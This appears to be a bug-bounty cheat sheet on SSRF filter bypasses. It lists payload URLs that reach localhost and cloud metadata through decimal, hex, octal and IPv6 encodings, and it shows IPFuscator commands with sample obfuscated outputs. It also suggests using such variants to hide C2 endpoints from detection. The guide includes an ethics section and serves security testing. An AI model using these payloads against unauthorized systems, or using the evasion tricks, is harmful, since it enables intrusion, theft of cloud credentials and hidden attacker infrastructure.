# 🛑 SSRF Payloads & IPFuscation Guide
![SSRF Payloads   IPFuscation Guide](https://github.com/user-attachments/assets/20e64ea1-60d5-4e09-82eb-f96fc28c8b4b)

---

## 🛑 Some SSRF Payloads

**Classic Bypasses**
- `http://00000`  
- `http://2130706433` (127.0.0.1 as decimal)  
- `http://0x7f.1` (hex + dot notation)  
- `http://metadata` (short & sweet)

**Why these work**
- Blacklists often miss decimal/hex/octal IP encodings.  
- `00000` → `0` → `localhost` in many parsers.  
- Short hostnames like `metadata` can bypass filters that only check for the full cloud metadata IP (`169.254.169.254`).

**Pro Tips**
- Try `http://0x7f000001` (hex full IP)  
- Use IPv6 forms like `http://[::]:80` for IPv6 bypass attempts  
- Mix case in hostnames: `MetaData` or `MeTadAta` (some filters are case-sensitive)

> ⚠️ SSRF blacklists are the easiest to bypass. Most regex filters fail on even basic encoding tricks. Use these techniques only in authorized testing environments.

---

## 🛠 What is IPFuscation?

**IPFuscation** is the practice of representing IP addresses in alternative formats (decimal, hexadecimal, octal, or mixed forms) which many parsers still interpret as the same target address. This can defeat naive blacklist filters, logging rules, or simple string matches used in defenses.

**Tool:** IPFuscator  
- Repo: `https://github.com/vysecurity/IPFuscator`

**Usage**
```bash
git clone https://github.com/vysecurity/IPFuscator
python ipfuscator.py 127.0.0.1
```

**Sample outputs**
- Decimal: `2130706433`  
- Hexadecimal: `0x7f000001`  
- Octal: `017700000001`  
- Mixed Formats: `0x7f.0x0.0.01` or `0177.0.0.01`  
- Padded/obfuscated: `0x000000000007f.0x000000000000000000000000000000.0x0000.0x0000000000000000000000001`

You can use these variants in URLs, command arguments, or C2 endpoints to evade simple detections.

**Why it works**
- Many defenses match literal strings like `127.0.0.1` or `localhost`.  
- Alternative representations of the same IP often bypass naive filters or regexes.

---

## 🧠 Safety & Ethics
- Only use SSRF payloads and IP obfuscation techniques on systems you are authorized to test.  
- Misuse can lead to serious legal consequences and harm other systems.  
- When testing cloud metadata endpoints, avoid exfiltrating secrets — focus on detection and responsible disclosure.

---

## 🔗 References & Tools
- IPFuscator: https://github.com/vysecurity/IPFuscator  
- OWASP SSRF Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

---

Follow **@[cybersecplayground](https://t.me/cybersecplayground)** for daily payload drops, recon tricks, and bug bounty tips.  
#SSRF #BugBounty #WebSecurity #RedTeam #Hacking
